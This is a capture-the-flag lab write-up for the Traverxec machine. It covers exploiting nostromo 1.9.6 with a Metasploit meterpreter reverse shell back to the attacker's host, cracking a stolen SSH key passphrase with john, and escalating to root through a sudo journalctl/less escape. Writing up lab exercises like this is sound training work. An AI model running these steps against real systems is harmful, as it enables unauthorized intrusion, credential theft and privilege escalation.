# Traverxec

<table>
  <tr>
    <td style="text-align:right;"><b>OS</b></td>
    <td>Linux</td>
  </tr>
  <tr>
    <td style="text-align:right;"><b>Difficulty</b></td>
    <td>Easy</td>
  </tr>
  <tr>
    <td style="text-align:right;"><b>Points</b></td>
    <td>20</td>
  </tr>
  <tr>
    <td style="text-align:right;"><b>Release</b></td>
    <td>16 Nov 2019</td>
  </tr>
  <tr>
    <td style="text-align:right;"><b>IP</b></td>
    <td>10.10.10.165</td>
  </tr>
</table>

## User

To begin, we will add the entry `10.10.10.165 traverxec.htb` to `/etc/hosts` and then start scanning.

```
# nmap -sC -sV traverxec.htb
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We see that SSH and HTTP are open. If we try to browse to `http://traverxec.htb`, we are met by a simple placeholder website. Looking through the source code and other files downloaded, there isn't anything particularly interesting. We find the same dead end if we try to enumerate for potential directories and files. 

We will go back to the `nmap` scan for more information. One thing to notice is the HTTP server is not running with the standard apache but with nostromo v1.9.6.

### Exploitation

If we search for recent vulnerabilities for nostromo, we find CVE-2011-0751. While this vulnerability was originally meant for versions <=1.9.4, it turns out there is a variant of the same vulnerability for versions >=1.9.6.

If we search in Metasploit, we find a module for this vulnerability that also has support for >=1.9.6 versions.

```
msf5 > search nostromo

Matching Modules
================

   #  Name                                   Disclosure Date  Rank  Check  Description
   -  ----                                   ---------------  ----  -----  -----------
   0  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution
```

Let's now set up this exploit, check for compatibility, and exploit.

```
msf5 > use exploit/multi/http/nostromo_code_exec 
msf5 exploit(multi/http/nostromo_code_exec) > set RHOST traverxec.htb
RHOST => traverxec.htb
msf5 exploit(multi/http/nostromo_code_exec) > check
msf5 exploit(multi/http/nostromo_code_exec) > set target 1
target => 1
[*] 10.10.10.165:80 - The target appears to be vulnerable.
msf5 exploit(multi/http/nostromo_code_exec) > set LHOST 10.10.14.120
LHOST => 10.10.14.120
msf5 exploit(multi/http/nostromo_code_exec) > set LPORT 4444
LPORT => 44444
msf5 exploit(multi/http/nostromo_code_exec) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
PAYLOAD => linux/x64/meterpreter/reverse_tcp
msf5 exploit(multi/http/nostromo_code_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.120:4444 
[*] Configuring Automatic (Linux Dropper) target
[*] Sending linux/x64/meterpreter/reverse_tcp command stager
[*] Sending stage (3021284 bytes) to 10.10.10.165
[*] Meterpreter session 1 opened (10.10.14.120:4444 -> 10.10.10.165:53586) at 2020-01-20 17:12:05 -0500
[*] Command Stager progress - 100.00% done (823/823 bytes)

meterpreter > 
```

Now that we have a meterpreter shell, we can look around the filesystem for interesting files.

### Information Gathering

```
meterpreter > ls -la /home
Listing: /home
==============

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40711/rwx--x--x  4096  dir   2020-01-20 17:06:10 -0500  david
```

We see that there is another user on the system, David. One peculiar thing to notice is that everyone can execute on his home directory, but they can't read or write. How does this make sense? While we cannot see the contents or read anything in the root of his home, we can change to a directory within if we know the name. There might be a way to determine the name of a directory within that has more normal permissions. 

Let's take a look again at the nostromo server. Normally we can expect web servers to host from `/var/www` but this one is from `/var/nostromo` indicating some custom configuration.

```
meterpreter > cd /var/nostromo/conf 
meterpreter > cat nhttpd.conf 
...
```

Looking at sample configuration files online and comparing to this, we see an interesting difference at the bottom.

```
# HOMEDIRS [OPTIONAL]

homedirs		    /home
homedirs_public		public_www
```

The homedirs functionality is usually commented out but here it is being used. Looking at the [nhttpd documentation](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd), we see that this enables us to view users' home directories by using `/~user`. If we go to `http://traverxec.htb/~david`, we see his private page.

![David's home](images/david.png)

From this page, we don't have a hint of what we can access now. On a normal web server, pages you can view are in a `public_html` directory. The `homedirs_public` constant suggests that this is how users host content from their home directories. In order to view a page in the browser, we would have to know its name, which we don't. However, since we know a directory now, we can `cd` into it from the terminal!

```
meterpreter > cd /home/david/public_www
meterpreter > ls
Listing: /home/david/public_www
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  402   fil   2019-10-25 15:45:10 -0400  index.html
40755/rwxr-xr-x   4096  dir   2019-10-25 17:02:59 -0400  protected-file-area

meterpreter > cd protected-file-area 
meterpreter > ls
Listing: /home/david/public_www/protected-file-area
===================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  45    fil   2019-10-25 15:46:01 -0400  .htaccess
100644/rw-r--r--  1915  fil   2019-10-25 17:02:59 -0400  backup-ssh-identity-files.tgz

meterpreter > 
```

We can now view some of the files in David's home and even find a backup file for his SSH credentials. If we extract these and crack them, we will be able to SSH as David and properly view his entire home directory.

### SSH

```
meterpreter > download backup-ssh-identity-files.tgz
[*] Downloading: backup-ssh-identity-files.tgz -> backup-ssh-identity-files.tgz
[*] Downloaded 1.87 KiB of 1.87 KiB (100.0%): backup-ssh-identity-files.tgz -> backup-ssh-identity-files.tgz
[*] download   : backup-ssh-identity-files.tgz -> backup-ssh-identity-files.tgz
```

```
# tar -xzvf backup-ssh-identity-files.tgz 
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

Now that we have David's `ssh` directory, we can take his private key and crack the password that is encrypting it.

```
# ssh2john home/david/.ssh/id_rsa > hash.txt
# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (home/david/.ssh/id_rsa)
...
```

Now that we know the password for the private key is `hunter` and can SSH as David and get the flag.

```
# ssh -i home/david/.ssh/id_rsa david@traverxec.htb
Enter passphrase for key 'home/david/.ssh/id_rsa': 
...
david@traverxec:~$ cat user.txt 
7db0b4**************************
```

## Root

Now that we can see the full contents of David's home, we notice the interesting `bin` directory. In here, we see `server-stats.sh` which is a script and `server-stats.head` which is some formatting for the script output. Let's take a look at the script:

```bash
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

This script appears to be doing some stats and grabbing the latest 5 entries from `journalctl`. What stands out right away is that `journalctl` is being called as sudo. Since David can run this script, he must be able to run the individual command as well.

We can utilize [GTFOBins](https://gtfobins.github.io/gtfobins/journalctl/) to take advantage of this and gain a root shell through `journalctl`. Once we call the command, the output will be displayed using `less` and the command will essentially be paused as root. From here, we can easily escape to a shell and get the flag.

```
$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
...
lines 1-6/6 (END)
!/bin/bash
root@traverxec:/home/david# id
uid=0(root) gid=0(root) groups=0(root)
root@traverxec:/home/david# cat /root/root.txt 
9aa36a**************************
```
